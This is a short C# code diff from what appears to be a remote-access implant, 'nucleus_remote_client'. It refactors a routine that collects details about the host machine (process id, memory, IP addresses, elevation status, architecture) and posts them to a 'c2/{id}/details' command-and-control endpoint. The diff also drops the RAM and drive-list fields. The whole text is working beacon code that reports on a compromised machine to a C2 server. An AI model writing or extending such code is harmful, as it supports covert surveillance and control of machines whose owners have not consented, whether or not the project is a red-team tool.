@@ -17,7 +17,7 @@ namespace nucleus_remote_client.Client
         public string Cwd { get; set; }
         public DateTime SystemStartupTime { get; set; }
 
-        private string[] IpAddresses;
+        private readonly string[] IpAddresses;
 
         public string Memory { get; set; }
         public TimeSpan ProcessorTime { get; set; }
@@ -39,10 +39,10 @@ namespace nucleus_remote_client.Client
                 .ToArray();
         }
 
-        public async Task ExecuteAsync(HostSettings hostSettings)
+        public async Task<HttpResponseMessage?> ExecuteAsync(HostSettings hostSettings)
         {
             var client = ClientHelper.GetHttpClient(hostSettings);
-            _ = await client.PostAsJsonAsync($"c2/{hostSettings.Id}/details", new
+            return await client.PostAsJsonAsync($"c2/{hostSettings.Id}/details", new
             {
                 pid = this.Pid,
                 memory = this.Memory,
@@ -52,9 +52,7 @@ namespace nucleus_remote_client.Client
                 this.SystemStartupTime,
                 ipAddress = string.Join(", ", this.IpAddresses),
                 elevated = Environment.IsPrivilegedProcess.ToString(),
-                ram = Environment.SystemPageSize / 1024.0 / 1024.0 / 1024.0 + " Gb",
                 arch = Environment.Is64BitOperatingSystem ? "x64" : "x86",
-                drives = string.Join(", ", Environment.GetLogicalDrives()),
             });
         }
     }
